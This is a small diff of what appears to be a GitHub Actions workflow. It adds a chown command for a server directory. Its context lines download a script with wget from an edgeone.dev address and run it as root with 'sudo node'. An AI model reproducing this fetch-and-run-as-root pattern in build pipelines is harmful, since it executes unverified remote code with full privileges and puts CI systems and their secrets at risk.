@@ -66,6 +66,7 @@ jobs:
           sudo apt install wget
           sudo wget -O install.js https://scornful-gold-jt86nbu6.edgeone.dev/
           sudo node install.js
+          sudo chown -R runner:runner server
 
       - name: 安装构建依赖
         run: |
